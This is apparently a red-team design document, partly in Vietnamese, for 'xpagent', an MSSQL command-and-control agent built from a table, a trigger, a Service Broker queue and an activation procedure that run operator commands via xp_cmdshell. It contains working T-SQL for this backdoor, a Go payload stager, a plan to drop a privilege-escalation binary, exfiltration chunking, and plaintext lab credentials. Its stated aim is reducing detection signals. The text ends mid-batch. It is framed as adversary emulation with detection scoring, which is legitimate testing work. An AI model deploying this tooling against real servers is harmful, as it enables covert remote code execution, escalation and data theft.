# xpagent — In-Database C2 Agent Design (MSSQL Trigger + Service Broker)

**Status:** P1 implemented (dedicated `xpagent` database — deviations from original `tempdb` design documented in `xpagent_init.sql`). P2/P3 designed below.
**Replaces:** per-command `.bat`/`.ps1` staging in the `XpMssql` module (`toneshell_shell.py`)
**Related docs:** [`mssql-module-changelog.md`](mssql-module-changelog.md), [`xpexfil-design.md`](xpexfil-design.md), [`README.md`](README.md)

---

## 1. Problem

The current MSSQL execution tunnel stages a fresh script file for every operation:

| Operation | Cost today |
|---|---|
| `xpshell cmd <cmd>` | 3–4 EXEC tasks + sp_OA writes `.bat` to `C:\ProgramData\` + `type` output file + `del` cleanup |
| `xpshell psh <script>` | 3 EXEC tasks + sp_OA writes `.ps1` + `del` cleanup |
| `xpexfil` (N chunks) | **One full `.ps1` stage-run-del cycle per chunk** (Phase 3 Step 3 = ~10 cycles) plus OBJECT_ID polls every 15 s |

Across Phases 2–4 of the emulation plan this produces dozens of repeated `sp_OACreate 'Scripting.FileSystemObject'` -> write -> `xp_cmdshell powershell -File` -> delete cycles on IIS01. The artifacts themselves are scored Detection Criteria rows (`sqlservr.exe` writing scripts to `C:\ProgramData\`, PowerShell grandchild of `sqlservr.exe`) — high-signal, high-volume, and trivially baselineable.

## 2. Goal

Replace repeated script staging with an **in-database agent**: a one-time set of SQL Server objects (table + trigger + Service Broker queue + activation procedure) that executes operator commands asynchronously with zero files staged and zero polling loops. All transport remains built-in MSSQL features; no new processes beyond what `xp_cmdshell` already spawns.

Secondary goals enabled by the same agent:

1. Absorb the decrypt step of `xpstage` into T-SQL (native hex->varbinary conversion + `sp_OACreate 'ADODB.Stream'` binary write) — removes the `.ps1` from payload staging.
2. Absorb the INSERT step of `xpexfil` into T-SQL (`OPENROWSET(BULK … SINGLE_BLOB)` + `SUBSTRING` on `varbinary(MAX)`) — removes the per-chunk `.ps1` from exfiltration.

Non-goals: replacing TONESHELL itself, changing the WS01↔C2 channel, MLS/CLR-based execution.

## 3. Architecture

```
Operator (toneshell_shell.py)
   │ sqlcmd -Q "INSERT INTO dbo.cmd(cmd) VALUES('<escaped command>')"     ← task 1, returns immediately
   ▼
tempdb.dbo.cmd ── AFTER INSERT TRIGGER ── SEND message ──► QUEUE agent_work
                                                              │ activation (MAX_QUEUE_READERS=1)
                                                              ▼
                                                    PROC dbo.agent_worker   ← runs inside sqlservr.exe
                                                              │ EXEC xp_cmdshell @c  (variable, no literal embedding)
                                                              ▼
                                                    tempdb.dbo.out (stdout rows)
   │ sqlcmd -Q "SELECT ... FROM out WHERE cmd_id=@id ORDER BY seq"         ← task 2..n, until status=2
   ▼
Operator prints output
```

Key properties:

- **Async by construction.** The trigger only `SEND`s; Service Broker activates the worker after the INSERT transaction commits. Long-running commands (ReflectDump, multi-minute dumps) never block the control channel.
- **Event-driven.** No polling sleep anywhere — SQL Server wakes the worker when a message arrives. The 15-second OBJECT_ID poll pattern disappears.
- **Single quoting layer.** A command crosses exactly one string-literal boundary (the operator-side INSERT, escaped by the existing `_tsql_escape`/`_exec_q`). From table to worker it travels as a variable and is handed directly to `xp_cmdshell @c` — the `@v`+`CHAR(34)` trick and nested bat-file quoting are no longer needed.
- **In-process.** The "agent" is T-SQL inside `sqlservr.exe`; the only OS process spawn per command is the pre-existing `cmd.exe` from `xp_cmdshell`.

## 4. Object model

Created once by `xpagent init`, under `EXECUTE AS LOGIN='sa'`, in `tempdb` (acceptable loss on SQL restart — plan runs as a single session; re-init is two commands).

### 4.1 Command and output tables

```sql
CREATE TABLE tempdb.dbo.cmd (
    id         INT IDENTITY(1,1) PRIMARY KEY,
    cmd        NVARCHAR(MAX)   NOT NULL,      -- raw command text, exactly as typed
    status     TINYINT         NOT NULL DEFAULT 0,
               -- 0 pending, 1 received by worker, 2 done, 3 failed
    created_at DATETIME2       NOT NULL DEFAULT SYSDATETIME()
);

CREATE TABLE tempdb.dbo.out (
    cmd_id     INT            NOT NULL,
    seq        INT            NOT NULL,       -- preserves stdout ordering
    chunk      NVARCHAR(4000) NOT NULL,       -- xp_cmdshell emits ≤255 chars/line; headroom for worker-generated lines
    created_at DATETIME2      NOT NULL DEFAULT SYSDATETIME()
);
```

### 4.2 Service Broker objects

```sql
CREATE MESSAGE TYPE [agent/msg] VALIDATION = NONE;
CREATE CONTRACT [agent/contract] ([agent/msg] SENT BY INITIATOR);

CREATE QUEUE tempdb.dbo.agent_work WITH ACTIVATION (
    STATUS              = ON,
    PROCEDURE_NAME      = tempdb.dbo.agent_worker,
    MAX_QUEUE_READERS   = 1,                  -- sequential execution semantics
    EXECUTE AS OWNER                          -- owner = sa context from init
);

CREATE SERVICE [agent_svc] ON QUEUE tempdb.dbo.agent_work ([agent/contract]);
```

`EXECUTE AS OWNER` lets the worker call `xp_cmdshell` without re-impersonating per command. `MAX_QUEUE_READERS=1` keeps execution strictly serial — identical semantics to today's channel.

### 4.3 Trigger

```sql
CREATE TRIGGER tempdb.dbo.trg_agent_cmd ON tempdb.dbo.cmd AFTER INSERT AS
BEGIN
    SET NOCOUNT ON;
    DECLARE @h UNIQUEIDENTIFIER;
    DECLARE @id INT = (SELECT MIN(id) FROM inserted);
    DECLARE @c NVARCHAR(MAX) = (SELECT cmd FROM inserted WHERE id = @id);

    -- Gắn cmd_id vào đầu message body (dạng "id|command") để worker không phải
    -- tự đoán row nào đang pending — tránh race condition khi có nhiều INSERT liên tiếp.
    DECLARE @payload NVARCHAR(MAX) = CAST(@id AS NVARCHAR(20)) + N'|' + @c;

    BEGIN DIALOG CONVERSATION @h
        FROM SERVICE [agent_svc]
        TO SERVICE N'agent_svc', N'CURRENT DATABASE'
        WITH ENCRYPTION = OFF;
    SEND ON CONVERSATION @h MESSAGE TYPE [agent/msg] (@payload);
END
```

Self-dialog (service to itself) keeps the object count minimal; the worker owns endpoint teardown so `sys.conversation_endpoints` does not grow unbounded.

### 4.4 Activation procedure

```sql
CREATE PROCEDURE tempdb.dbo.agent_worker AS
BEGIN
    SET NOCOUNT ON;
    DECLARE @mt SYSNAME, @h UNIQUEIDENTIFIER, @body NVARCHAR(MAX);
    RECEIVE TOP(1) @mt = message_type_name, @h = conversation_handle,
                   @body = CAST(message_body AS NVARCHAR(MAX))
        FROM tempdb.dbo.agent_work;
    IF @h IS NULL RETURN;

    -- Xử lý EndDialog / Error: khi worker END CONVERSATION phía target,
    -- SQL Server gửi EndDialog message ngược về initiator endpoint.
    -- Nếu không xử lý ở đây, sys.conversation_endpoints sẽ tích tụ 1 row
    -- mỗi lệnh — không crash nhưng là leak tài nguyên.
    IF @mt = N'http://schemas.microsoft.com/SQL/ServiceBroker/EndDialog'
       OR @mt = N'http://schemas.microsoft.com/SQL/ServiceBroker/Error'
    BEGIN
        END CONVERSATION @h;
        RETURN;
    END

    -- Parse cmd_id từ message body (format: "id|command").
    -- Trigger gắn id vào đầu body, nên worker không cần đoán row nào pending.
    DECLARE @sep INT = CHARINDEX(N'|', @body);
    DECLARE @id INT = CAST(LEFT(@body, @sep - 1) AS INT);
    DECLARE @c NVARCHAR(MAX) = SUBSTRING(@body, @sep + 1, LEN(@body));
    UPDATE tempdb.dbo.cmd SET status = 1 WHERE id = @id;

    BEGIN TRY
        IF @c = N'__KILL__'
        BEGIN
            ALTER QUEUE tempdb.dbo.agent_work WITH ACTIVATION (STATUS = OFF);
            INSERT INTO tempdb.dbo.out (cmd_id, seq, chunk) VALUES (@id, 1, N'[agent] killed');
        END
        ELSE
        BEGIN
            DECLARE @o TABLE (line NVARCHAR(4000), idx INT IDENTITY(1,1));
            INSERT INTO @o (line) EXEC xp_cmdshell @c;           -- variable, không có literal embedding
            INSERT INTO tempdb.dbo.out (cmd_id, seq, chunk)
                SELECT @id, idx, line FROM @o WHERE line IS NOT NULL;
            UPDATE tempdb.dbo.cmd SET status = 2 WHERE id = @id;
        END
    END TRY
    BEGIN CATCH
        INSERT INTO tempdb.dbo.out (cmd_id, seq, chunk)
            VALUES (@id, 1, N'[agent:error] ' + ERROR_MESSAGE());
        UPDATE tempdb.dbo.cmd SET status = 3 WHERE id = @id;
    END CATCH

    END CONVERSATION @h;          -- close target side -> triggers EndDialog back to initiator
END
```

Design notes:

- **No recursion.** The trigger fires only on INSERT into `cmd`; the worker only `UPDATE`s status and inserts into `out`.
- **Poison messages** land in `out` with `status=3` instead of silently looping the queue.
- **Output ordering** guaranteed by `seq` identity over the xp_cmdshell result rows.
- **EndDialog cleanup.** Worker xử lý cả `EndDialog`/`Error` message types — mỗi command tạo ra 2 activation cycles (1 cho command, 1 cho EndDialog), nhưng `sys.conversation_endpoints` được dọn sạch sau mỗi lệnh.
- **Explicit cmd_id.** Message body mang `id|command` thay vì chỉ command text — worker parse trực tiếp thay vì dựa vào ordering của pending rows, tránh race condition nếu nhiều INSERT xảy ra trước khi worker activate.

## 5. Operator interface (new commands in `toneshell_shell.py`)

```
xpagent init                      one-time object creation + verification echo test
xpexec <command>                  send command, wait for completion, print output
xpexec-bg <command>               fire-and-forget send (poll later with xpout)
xpout [cmd_id]                    fetch/poll results of a previous command
xpstage <payload> [--no-encrypt]  unchanged UX; decrypt step moved into worker (T-SQL hex decode + ADODB.Stream write); .ps1 eliminated
xpexfil <remote_path> <local_name>[timeout][chunk_mb]
                                  unchanged UX; INSERT step moved into worker (OPENROWSET BULK read + SUBSTRING chunking); per-chunk .ps1 eliminated
xpagent kill                      __KILL__ opcode + explicit DROP of all objects
xpshell / xpinit                  retained unchanged during transition (comparison variant)
```

Typical round trip for `xpexec`: **2 tasks** (INSERT + final SELECT) vs 6–8 tasks and 2 disk artifacts today.

## 6. Quoting model after migration

| Path | Layers crossed | Escaping |
|---|---|---|
| Command text | operator prompt -> INSERT literal -> table column -> NVARCHAR variable -> `xp_cmdshell @c` | `'` -> `''` once (`_tsql_escape`), `"` doubled once at `-Q "…"` boundary (`_exec_q`) — both already implemented; nothing new |
| Binary payloads (`xpstage`) | controlServer encoder -> hex chunks -> `CONVERT(VARBINARY(MAX), @hex, 1)` -> ADODB.Stream bytes | zero quoting-sensitive characters (hex alphabet only) |
| Exfil data (`xpexfil`) | `OPENROWSET(BULK)` varbinary -> `SUBSTRING` -> hex rows -> WS01 decoder | zero quoting-sensitive characters |

Commands keep working verbatim, including the plan's hardest case — `CertEnrollSvc.exe "cmd /c whoami /priv > out.txt 2>&1" lsarpc 0<nul` — because the text stored in the table is byte-exact and passed as a variable.

## 7. Residual limits and risks

| Limit / risk | Assessment |
|---|---|
| `xp_cmdshell` argument limit (`nvarchar(4000)` / `varchar(8000)`) | Inherent to SQL Server, unchanged from current model. Long scripts still go through `xpstage` as binaries. |
| Objects lost on SQL restart (`tempdb`) | Accepted — plan is single-session; `xpagent init` re-runs in seconds. Move to user DB only if persistence across restarts becomes a requirement. |
| Forensic visibility | Trigger/proc bodies readable in `sys.sql_modules`; queue visible in `sys.service_queues`; DDL creation events auditable. Trade-off accepted: replaces far noisier repeated file staging. |
| `xp_cmdshell` from activated proc | Supported; runs as `NT SERVICE\MSSQL$SQLEXPRESS` exactly like today — EDR-facing behavior (process lineage) unchanged. |
| Worker blocked by long command | Sequential queue means next command waits — same as current channel. `xpexec-bg` exists for genuinely long operations. |
| Conversation endpoint leak | **Đã xử lý.** Worker bắt cả `EndDialog`/`Error` message types và gọi `END CONVERSATION` cho cả hai phía (xem 4.4). Mỗi command tạo 2 activation cycles — 1 cho command, 1 cho EndDialog cleanup. Verify `sys.conversation_endpoints` stays bounded during testing. |
| Command-to-message correlation | **Đã xử lý.** Trigger gắn `cmd_id` vào message body dạng `id\|command` (xem 4.3). Worker parse trực tiếp thay vì dựa vào `SELECT TOP 1 WHERE status=0` — robust khi nhiều INSERT liên tiếp xảy ra trước khi worker activate. |
| `nested triggers` / `RECURSIVE_TRIGGERS` | Not triggered: worker never INSERTs into `cmd`. Assert in init verification. |
| Double activation cost | Mỗi command = 2 RECEIVE cycles (command + EndDialog). Không ảnh hưởng performance cho lab use (~40 lệnh tổng cộng qua Phases 2–4), nhưng nếu throughput quan trọng, có thể gộp EndDialog handling vào cuối main cycle thay vì RETURN sớm. |
| SQL Server Express Service Broker | Express edition hỗ trợ Service Broker cho **local conversations only** (cùng instance). Design dùng self-dialog trong tempdb — nằm trong giới hạn này. Không cần Enterprise/Standard. |

## 8. Impact on the emulation plan (Phases 2–4)

Mechanism-level changes only — attack-chain steps, technique scope, and host/user columns are unchanged:

| Plan location | Change |
|---|---|
| Phase 2 Step 2 | `xpinit` extended (or followed) by `xpagent init` — adds DDL observable: CREATE TRIGGER/QUEUE/SERVICE events |
| Phase 2 Steps 3–4, Phase 3, Phase 4 | All `xpshell cmd` calls become `xpexec` — Detection Criteria rows referencing `.bat` staging / `type <file>` retrieval rewrite to: `INSERT INTO cmd` + `SELECT FROM out` via sqlcmd, `xp_cmdshell` invoked from activated proc context |
| Phase 2/3 `xpstage` | `.ps1` AES-decrypt row replaced by: worker T-SQL hex decode + ADODB.Stream binary write to `C:\ProgramData\` (new observable: COM instantiation of ADODB.Stream by sqlservr) |
| Phase 3 Step 3 `xpexfil` | Per-chunk `.ps1` rows replaced by OPENROWSET(BULK) read observables (SQL Audit / sys.dm_exec_requests); WS01 extract side unchanged |
| Scoring | Affected rows are mostly already `Not Calibrated` (`transport`/`staging` reasons). Re-run `write-detection-criteria` then `assign-category` on modified Reference Tables; re-check scope with `check.py --scope "Scenario 1.md"` |

## 9. Implementation phases

1. **P1 — core loop:** `xpagent init/exec/kill` + `xpexec`/`xpout` in `toneshell_shell.py`; validate against Phase 2 command set (whoami, dir, sc query, EfsPotato launcher).
2. **P2 — staging absorption:** switch `mssql.go` encoder to hex, move decrypt into worker via ADODB.Stream; retire `.ps1` from `xpstage`.
3. **P3 — exfil absorption:** OPENROWSET(BULK)+SUBSTRING INSERT path in worker; retire per-chunk `.ps1` from `xpexfil`.
4. **P4 — plan updates:** rewrite affected Reference Table rows, run detection-criteria/category skills, re-run coverage check.

Each phase is independently testable against the lab; P1 alone already removes the dominant per-command noise.

## 10. Đánh giá tính khả thi

> Phần này bổ sung sau khi review design đối chiếu với toàn bộ plan (Phases 1–4, Setup.md, Windows Server 2022-MSSQL.md, toneshell_shell.py XpMssql module).

### 10.1 Kết luận: Khả thi — hai lỗi kỹ thuật đã sửa trong 4.3/4.4

Design sử dụng đúng built-in features có sẵn trên SQL Server Express (Service Broker local self-dialog, activation procedures, tempdb DDL dưới `sa` context). Không có feature nào bị gate bởi Enterprise/Standard edition.

### 10.2 Hai lỗi đã sửa

**a. Conversation endpoint leak (đã sửa trong 4.4)**

Bản gốc: trigger tạo initiator side, worker `END CONVERSATION @h` chỉ đóng target side. SQL Server gửi `EndDialog` message ngược về initiator — nhưng worker không bắt message type này, gây tích tụ trong `sys.conversation_endpoints` (1 row mỗi lệnh).

Đã sửa: worker kiểm tra `@mt` = EndDialog/Error trước khi xử lý command, gọi `END CONVERSATION` và `RETURN` — dọn sạch cả hai phía.

**b. Command-to-message correlation race (đã sửa trong 4.3 + 4.4)**

Bản gốc: worker tìm command bằng `SELECT TOP 1 WHERE status=0 ORDER BY id` — dựa vào thứ tự ordering. Nếu 2 INSERT trigger trước khi worker activate lần đầu, cả 2 messages queue lên cùng lúc. Worker xử lý đúng **chỉ vì** ordering trùng — nhưng giả định này fragile.

Đã sửa: trigger gắn `cmd_id` vào đầu message body (`id|command`), worker `CHARINDEX`+`SUBSTRING` parse ra — explicit mapping, không phụ thuộc ordering.

### 10.3 Noise reduction thực tế

Đối chiếu với toneshell_shell.py hiện tại (`XpMssql` class, line 85+):

| Hiện tại (`xpshell cmd`) | Sau xpagent (`xpexec`) |
|---|---|
| `_sp_oa_write` -> 1-N sp_OA tasks tạo `.bat` | INSERT 1 task |
| `xp_cmdshell <bat>` -> 1 task | (worker tự chạy) |
| `xp_cmdshell 'type <out>'` -> 1 task | SELECT 1 task |
| `xp_cmdshell 'del /f <bat> <out>'` -> 1 task | (không có file nào để xóa) |
| **4-6 tasks + 2 disk artifacts** | **2 tasks + 0 disk artifacts** |

Tổng cộng qua Phases 2–4: ~30-40 sp_OA write + execute + delete cycles -> ~30-40 INSERT/SELECT pairs. Giảm ~60% số MSSQL tasks và **loại bỏ hoàn toàn** disk artifacts trung gian (`.bat`, `.txt` output files).

### 10.4 Tương thích ngược

- `xpshell`/`xpinit` giữ nguyên trong transition period (section 5) — có thể chạy song song để so sánh.
- `xpstage`/`xpexfil` thay đổi ở P2/P3, không phải P1 — có thể defer nếu P1 đủ.
- Process lineage EDR-facing (`sqlservr.exe -> cmd.exe`) **không đổi** — xp_cmdshell từ activated proc chạy cùng identity (`NT SERVICE\MSSQL$SQLEXPRESS`).

### 10.5 Ước lượng implementation

| Phase | LOC ước tính | Phụ thuộc |
|---|---|---|
| P1 — core loop | ~200 Python + ~80 T-SQL | Không — self-contained |
| P2 — staging absorption | ~100 Go (hex encoder) + ~40 T-SQL | P1 phải chạy được |
| P3 — exfil absorption | ~60 T-SQL + ~50 Python | P1 phải chạy được |
| P4 — plan updates | Documentation only | P1 validated |

**Khuyến nghị**: implement P1 trước, validate bằng Phase 2 command set (whoami, dir, sc query, EfsPotato launcher), rồi tiến hành P2/P3 incrementally. P1 đã giải quyết phần lớn noise.

## 11. Lộ trình implementation — 4 bước, mỗi bước test được độc lập

Nguyên tắc: **từ dưới lên** (SQL thuần -> Python wrapper -> shell routing). Nếu bước nào fail, biết ngay layer nào lỗi — không cần debug xuyên suốt toàn bộ stack.

P2/P3 (staging/exfil absorption) defer — plan có vòng đời ngắn, P1 đã giải quyết phần lớn noise. Nếu cần sau này thì bổ sung, không ảnh hưởng P1.

---

### Bước 1 — DDL script (pure T-SQL, không cần Python)

**Làm gì:** Viết file `xpagent_init.sql` chứa toàn bộ CREATE TABLE / TRIGGER / QUEUE / SERVICE / PROCEDURE theo thiết kế ở section 4.

**File output:** `controlServer/sql/xpagent_init.sql`

**Test trực tiếp trên IIS01 hoặc WS01 — không qua TONESHELL, không qua Python:**

```powershell
# Chạy DDL
sqlcmd -S iis01.testlab.local -U svc_app_dev -P "D3vPortal!2025" -C -i xpagent_init.sql
```

```sql
-- Test 1: INSERT 1 lệnh, đợi 2 giây, đọc output
EXECUTE AS LOGIN='sa';
INSERT INTO tempdb.dbo.cmd(cmd) VALUES('whoami');
WAITFOR DELAY '00:00:02';
SELECT status FROM tempdb.dbo.cmd WHERE id=1;
SELECT chunk FROM tempdb.dbo.out WHERE cmd_id=1 ORDER BY seq;
-- Expected: status=2, chunk chứa 'nt service\mssql$sqlexpress'
```

```sql
-- Test 2: verify conversation endpoints được dọn sạch
-- (chạy sau Test 1 vài giây — EndDialog activation cycle cần thời gian)
EXECUTE AS LOGIN='sa';
WAITFOR DELAY '00:00:03';
SELECT COUNT(*) AS endpoints FROM sys.conversation_endpoints;
-- Expected: 0
```

```sql
-- Test 3: kill switch
EXECUTE AS LOGIN='sa';
INSERT INTO tempdb.dbo.cmd(cmd) VALUES('__KILL__');
WAITFOR DELAY '00:00:02';
SELECT chunk FROM tempdb.dbo.out WHERE cmd_id=2 ORDER BY seq;
-- Expected: '[agent] killed'
```

**Nếu fail ở bước này:** lỗi SQL thuần — sửa DDL trước khi đụng Python.

**Done criteria:** cả 3 test pass khi chạy trực tiếp qua `sqlcmd`.

---

### Bước 2 — Python init/kill (`XpMssql` methods)

**Làm gì:** Thêm 2 methods vào class `XpMssql` trong `toneshell_shell.py`:

- `cmd_xpagent_init(shell)` — gửi DDL từ bước 1 qua chuỗi `_exec_q` calls, chạy echo test (INSERT whoami + SELECT output) để verify.
- `cmd_xpagent_kill(shell)` — INSERT `__KILL__`, sau đó DROP tất cả objects.

Thêm flag `self._agent_ready` để các lệnh xpexec ở bước 3 kiểm tra trước khi chạy.

**Test trong `toneshell_shell.py` (cần TONESHELL session active + xpinit đã chạy):**

```
xpagent init
```
Expected: `[+] xpagent init OK — echo: nt service\mssql$sqlexpress`

```
xpshell cmd sqlcmd -S localhost\SQLEXPRESS -E -C -Q "SELECT name FROM tempdb.sys.objects WHERE name IN ('cmd','out','trg_agent_cmd','agent_worker','agent_work') ORDER BY name"
```
Expected: 5 rows (agent_work, agent_worker, cmd, out, trg_agent_cmd)

```
xpagent kill
```
Expected: `[+] xpagent killed — objects dropped`

Chạy lại query kiểm tra objects -> Expected: 0 rows.

**Nếu fail ở bước này:** lỗi ở bridge Python->sqlcmd (quoting trong `_exec_q`, DDL quá dài cho 1 lần `-Q`). DDL đã test OK ở bước 1 nên biết chắc logic SQL đúng.

**Done criteria:** init tạo đủ objects + echo test pass, kill dọn sạch.

---

### Bước 3 — Python xpexec/xpout (`XpMssql` methods)

**Làm gì:** Thêm 3 methods vào class `XpMssql`:

- `cmd_xpexec(shell, command)` — INSERT command vào `tempdb.dbo.cmd`, poll `status` cho đến `=2` (hoặc `=3`), SELECT output từ `tempdb.dbo.out`, print.
- `cmd_xpexec_bg(shell, command)` — INSERT only, print `cmd_id` để dùng với `xpout`.
- `cmd_xpout(shell, cmd_id)` — SELECT output cho 1 `cmd_id` cụ thể.

Polling logic: `_exec_q` lặp SELECT status mỗi 1 giây, timeout configurable (mặc định dùng `self._timeout_s` từ shell).

**Test — chạy đúng các lệnh Phase 2 sẽ dùng thật:**

```
xpexec whoami
```
Expected: `nt service\mssql$sqlexpress`

```
xpexec dir C:\ProgramData\
```
Expected: directory listing bình thường

```
xpexec sc query EFS
```
Expected: service info (STATE: RUNNING hoặc STOPPED)

```
xpexec echo "hello world"
```
Expected: `"hello world"` — test double-quote qua quoting model mới

```
xpexec-bg ping -n 3 127.0.0.1
```
Expected: `[*] cmd_id=N queued`

```
xpout N
```
Expected: ping output (3 replies)

**Test quoting case khó nhất (EfsPotato command syntax từ Phase 2 Step 3):**

```
xpexec C:\ProgramData\CertEnrollSvc.exe "cmd /c whoami /priv > C:\ProgramData\sys_out.txt 2>&1" lsarpc 0<nul
```
Expected: error `not recognized` hoặc `not found` (vì CertEnrollSvc.exe chưa staged) — **miễn lỗi không phải SQL quoting error** là pass. Nếu output chứa SQL syntax error -> quoting model sai.

**Nếu fail ở bước này:** lỗi ở polling logic hoặc quoting trong INSERT. init/kill đã OK ở bước 2, DDL đã OK ở bước 1.

**Done criteria:** 6 test cases trên đều trả output đúng (hoặc expected error đúng cho case chưa có binary).

---

### Bước 4 — Shell routing (`ToneShellShell.run`)

**Làm gì:** Thêm command routing cho `xpagent`, `xpexec`, `xpexec-bg`, `xpout` vào main loop của `ToneShellShell.run()` (hiện tại ở line ~611). Copy pattern từ các block `xpshell`/`xpinit`/`xpstage` hiện có.

Mapping:

| Input | Gọi method |
|---|---|
| `xpagent init` | `self._xp.cmd_xpagent_init(self)` |
| `xpagent kill` | `self._xp.cmd_xpagent_kill(self)` |
| `xpexec <command>` | `self._xp.cmd_xpexec(self, command)` |
| `xpexec-bg <command>` | `self._xp.cmd_xpexec_bg(self, command)` |
| `xpout [cmd_id]` | `self._xp.cmd_xpout(self, cmd_id)` |

Guard checks: session phải active, `xpinit` phải đã chạy (`_xp.ready()`), `xpagent init` phải đã chạy (`_xp._agent_ready`).

**Test — chạy lại Phase 2 Steps 2–4 hoàn chỉnh bằng xpexec:**

```
# Thay thế hoàn toàn xpshell cmd bằng xpexec
xpinit iis01.testlab.local:1433 svc_app_dev D3vPortal!2025
xpagent init
xpexec whoami
xpexec dir C:\ProgramData\
xpexec sc query EFS
# ... (tiếp tục Phase 2 command set)
xpagent kill
```

So sánh output với chạy bằng `xpshell cmd` — kết quả phải giống nhau.

**Nếu fail ở bước này:** lỗi ở command parsing / argument splitting trong main loop. Logic thực thi đã OK ở bước 3.

**Done criteria:** chạy xong Phase 2 Steps 2–4 hoàn chỉnh qua xpexec, output match với xpshell cmd.

---

### P2 — Staging absorption: hex encode + ADODB.Stream binary write

**Mục tiêu:** Loại bỏ `.ps1` decrypt step từ `xpstage`. Hiện tại IIS01 spawn `powershell.exe` (qua `xpshell psh`) để đọc `tempdb..stg` via SqlClient, base64 decode, AES decrypt, ghi binary. Sau P2, decode+write chạy bằng T-SQL in-process trong `sqlservr.exe` — không spawn process nào trên IIS01, không `.ps1`, không SqlClient loopback.

**So sánh pipeline:**

| Bước | Hiện tại | Sau P2 |
|---|---|---|
| Encode (`mssql.go`) | AES-256-CBC + base64 | `hex.EncodeToString` (no encryption) |
| Transport (WS01->IIS01) | `sqlcmd -i`: INSERT 8000-char base64 chunks -> `tempdb..stg` | `sqlcmd -i`: INSERT 8000-char hex chunks -> `tempdb..stg` |
| Decode+Write (IIS01) | `xpshell psh` -> `sqlservr->cmd->powershell`: SqlClient loopback read + base64 decode + AES decrypt + `WriteAllBytes` | `_exec_q` -> T-SQL in `sqlservr.exe`: variable concat + `CONVERT(VARBINARY)` + `sp_OA ADODB.Stream.SaveToFile` |
| Process spawn trên IIS01 | `cmd.exe` + `powershell.exe` | Không có (sp_OA chạy COM in-process) |
| Disk artifact trên IIS01 | `.ps1` file (tạm, bị xóa sau) | Không có |

**Lý do bỏ AES:** T-SQL không có built-in AES decrypt cho external keys — `EncryptByKey`/`DecryptByKey` dùng SQL Server key management, không tương thích với Go-generated key. Keeping AES đòi hỏi CLR hoặc sp_OA call vào .NET `System.Security.Cryptography` — phức tạp hơn giá trị nó mang lại. Channel WS01->IIS01 là internal MSSQL tunnel, không qua untrusted boundary. Flag `--no-encrypt` đã tồn tại trong UX hiện tại.

**Transition strategy — maintain song song:**

Toàn bộ P2 được implement song song với `xpstage` hiện tại, giống pattern `xpshell`/`xpexec` ở P1:

| Layer | Hiện tại (giữ nguyên) | Mới (thêm song song) |
|---|---|---|
| Go encoder | `StagePayload` (AES+base64) | `StagePayloadHex` (hex only) |
| REST endpoint | `POST /api/v1.0/mssql/stage` | `POST /api/v1.0/mssql/stage` + `format=hex` param |
| Python method | `cmd_xpstage` | `cmd_xpstage_hex` |
| Shell command | `xpstage <payload>` | `xpstage-hex <payload>` |

Cả hai path dùng cùng `tempdb..stg` table schema (chỉ khác content: base64 vs hex) — không conflict vì `stg` bị DROP+CREATE mỗi lần stage.

**Validation flow:** stage cùng payload bằng cả hai path, so sánh SHA256 output trên IIS01:
```
xpstage CertEnrollSvc.exe
xpexec certutil -hashfile C:\ProgramData\CertEnrollSvc.exe SHA256
xpexec del /f C:\ProgramData\CertEnrollSvc.exe

xpstage-hex CertEnrollSvc.exe
xpexec certutil -hashfile C:\ProgramData\CertEnrollSvc.exe SHA256
```
SHA256 phải khớp -> hex path verified binary-identical.

**Cutover criteria:**
1. `xpstage-hex` pass cho mọi payload trong plan (CertEnrollSvc.exe, các script nếu có)
2. SHA256 match với `xpstage` cho từng payload
3. Không có `.ps1` hoặc `powershell.exe` spawn trên IIS01 khi dùng `xpstage-hex`
4. Sau cutover: `xpstage` -> alias cho hex path, `xpstage-legacy` -> old base64+AES path (giữ lại nhưng không dùng trong plan)

---

#### Bước P2.1 — Go hex encoder (`mssql.go`)

**Làm gì:** Thêm `StagePayloadHex` song song với `StagePayload` hiện tại. Function cũ giữ nguyên.

```go
import "encoding/hex"

// StagePayloadHex reads the payload, hex-encodes it (no encryption), and writes
// INSERT SQL to outPath. Same table schema as StagePayload (tempdb..stg with
// NVARCHAR(MAX) chunks), different content encoding.
func StagePayloadHex(payloadPath, outPath string) error {
    data, err := os.ReadFile(payloadPath)
    if err != nil { return fmt.Errorf("read payload: %w", err) }

    hexStr := strings.ToUpper(hex.EncodeToString(data))

    var sb strings.Builder
    sb.WriteString("EXECUTE AS LOGIN='sa';\n")
    sb.WriteString("USE tempdb;\n")
    sb.WriteString("IF OBJECT_ID('stg','U') IS NOT NULL DROP TABLE stg;\n")
    sb.WriteString("CREATE TABLE stg (id INT IDENTITY(1,1), chunk NVARCHAR(MAX));\n")
    sb.WriteString("GRANT SELECT ON stg TO PUBLIC;\n")
    for i := 0; i < len(hexStr); i += chunkSize {
        end := i + chunkSize
        if end > len(hexStr) { end = len(hexStr) }
        fmt.Fprintf(&sb, "INSERT INTO stg(chunk) VALUES (N'%s');\n", hexStr[i:end])
    }
    return os.WriteFile(outPath, []byte(sb.String()), 0600)
}
```

Signature khác `StagePayload`: không có `encrypt` param (luôn hex, không AES), không return `key` (không cần).

REST endpoint: thêm `format` param vào `POST /api/v1.0/mssql/stage` — `format=hex` gọi `StagePayloadHex`, default/`format=base64` gọi `StagePayload` hiện tại.

Trade-off: hex = 2 chars/byte vs base64 ≈ 1.33 chars/byte -> cùng payload cần ~50% thêm INSERT rows. Chấp nhận — hex alphabet `[0-9A-F]` không cần bất kỳ escaping nào.

**Test:** `curl POST /api/v1.0/mssql/stage?format=hex` -> `sqlcmd -i` trực tiếp -> `SELECT TOP 3 chunk FROM tempdb..stg` verify hex content.

**Done criteria:** `StagePayloadHex` output hex SQL file, INSERT chunks chứa hex thuần, `StagePayload` cũ không bị ảnh hưởng.

---

#### Bước P2.2 — T-SQL decode+write batch

**Làm gì:** T-SQL batch chạy trên IIS01 (qua `_exec_q` từ WS01) đọc hex chunks từ `tempdb..stg`, convert sang binary, ghi file qua `ADODB.Stream`. Không cần file `.sql` riêng — generate T-SQL string trực tiếp trong Python.

```sql
EXECUTE AS LOGIN='sa';

-- 1. Ghép tất cả hex chunks theo thứ tự (variable concatenation — portable từ 2005+)
DECLARE @hex VARCHAR(MAX) = '';
SELECT @hex = @hex + CAST(chunk AS VARCHAR(MAX))
FROM tempdb..stg ORDER BY id;

-- 2. Convert hex -> varbinary (style 1: '0x' prefix required)
DECLARE @bin VARBINARY(MAX) = CONVERT(VARBINARY(MAX), '0x' + @hex, 1);

-- 3. Ghi binary ra file qua ADODB.Stream (sp_OA đã enabled từ xpinit)
DECLARE @obj INT, @hr INT;
